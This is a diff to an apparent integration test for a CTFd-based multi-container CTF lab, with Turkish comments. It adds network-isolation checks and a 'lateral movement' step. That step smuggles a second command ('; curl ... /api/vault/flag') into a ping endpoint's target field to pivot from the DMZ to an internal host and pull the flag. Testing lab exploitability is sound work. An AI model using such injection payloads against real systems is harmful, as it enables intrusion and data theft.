@@ -590,24 +590,57 @@ with app.app_context():
         flags_dict = json.loads(flags_json)
         log_pass(f"Çoklu konteynerli lab başlatıldı: {domain} ({entry_ip}:{port})")
 
-        # 2. Servisin hazır olmasını bekle
+        # 2. Servisin hazır olmasını bekle ve DMZ Portalına bağlan
         time.sleep(2)
         cmd_http = f"ip netns exec {ns_t1} curl -s -m 5 http://{domain}:{port}/"
         res_http = run_cmd(cmd_http, check=False)
-        if res_http.returncode == 0 and len(res_http.stdout) > 0:
-            log_pass(f"Team 1 giriş makinesine (DMZ) başarıyla bağlandı: http://{domain}:{port}/")
+        if res_http.returncode == 0 and ("ACME Corp" in res_http.stdout or len(res_http.stdout) > 0):
+            log_pass(f"Team 1 DMZ Teşhis Portalına bağlandı: http://{domain}:{port}/")
         else:
-            log_fail("Giriş makinesine HTTP bağlantısı kurulamadı", res_http.stderr or res_http.stdout)
+            log_fail("Giriş makinesine (DMZ) HTTP bağlantısı kurulamadı", res_http.stderr or res_http.stdout)
 
-        # 3. Güvenlik İzolasyonu: Team 2 bu Compose labına erişememeli (Firewall DROP)
+        # 3. İzolasyon Doğrulaması: Dahili hedefe WireGuard üzerinden DOĞRUDAN erişilememeli
+        cmd_direct_target = f"ip netns exec {ns_t1} curl -s -m 2 http://internal-target:8080/"
+        res_direct = run_cmd(cmd_direct_target, check=False)
+        if res_direct.returncode != 0:
+            log_pass("Dahili hedefe (internal-target:8080) WireGuard tünelinden doğrudan erişim ENGELLENDİ (İzolasyon Başarılı).")
+        else:
+            log_fail("GÜVENLİK AÇIĞI! Dahili hedef (internal-target) doğrudan WireGuard tüneline maruz kalmış!", res_direct.stdout)
+
+        # 4. Güvenlik İzolasyonu: Team 2 bu Compose labına erişememeli (Firewall DROP)
         res_t2 = run_cmd(f"ip netns exec {ns_t2} curl -s -m 3 http://{entry_ip}:{port}/", check=False)
         if res_t2.returncode != 0:
             log_pass(f"Team 2'nin Team 1 Compose labına erişimi ENGELLENDİ: http://{entry_ip}:{port}/ [Firewall DROP / Timeout]")
         else:
             log_fail("GÜVENLİK AÇIĞI! Team 2, Team 1 Compose labına sızabildi!", res_t2.stdout)
 
-        # 4. Soru Çözümü & Otomatik Kapatma (Compose Down)
-        target_flag = flags_dict.get("FLAG_FINAL") or flags_dict.get("FLAG_INITIAL") or list(flags_dict.values())[0]
+        # 5. Gerçek Lateral Movement Sömürüsü: DMZ Komut Enjeksiyonu üzerinden Dahili Hedefi Sorgulama
+        log_step("   --> DMZ Komut Enjeksiyonu sömürülüyor ve iç ağa (internal-target) pivot yapılıyor...")
+        exploit_cmd = f"ip netns exec {ns_t1} curl -s -X POST http://{domain}:{port}/api/ping --data-urlencode 'target=127.0.0.1; curl -s http://internal-target:8080/api/vault/flag'"
+        res_exploit = run_cmd(exploit_cmd, check=False)
+        
+        expected_flag = flags_dict.get("FLAG_FINAL")
+        captured_flag = None
+
+        if res_exploit.returncode == 0:
+            try:
+                exp_data = json.loads(res_exploit.stdout)
+                out_text = exp_data.get("output", "")
+                flag_match = re.search(r"DEHLIZ\{[a-f0-9\-]+\}", out_text)
+                if flag_match:
+                    captured_flag = flag_match.group(0)
+                    log_pass(f"Lateral Movement Başarılı! Dahili kasadan bayrak sızdırıldı: {captured_flag}")
+                    if expected_flag and captured_flag == expected_flag:
+                        log_pass(f"Sızdırılan bayrak dinamik FLAG_FINAL ile tam eşleşti: {captured_flag}")
+                else:
+                    log_fail("Komut çalıştı ancak bayrak regex ile bulunamadı", out_text)
+            except Exception as e:
+                log_fail("Exploit çıktısı ayrıştırılamadı", f"{e} - {res_exploit.stdout}")
+        else:
+            log_fail("DMZ exploit isteği başarısız oldu", res_exploit.stderr or res_exploit.stdout)
+
+        # 6. Soru Çözümü & Otomatik Kapatma (Compose Down)
+        target_flag = captured_flag or expected_flag or list(flags_dict.values())[0]
         solve_cmd = f"""python3 -c "
 from CTFd import create_app
 from CTFd.models import db, Users, Teams, Challenges
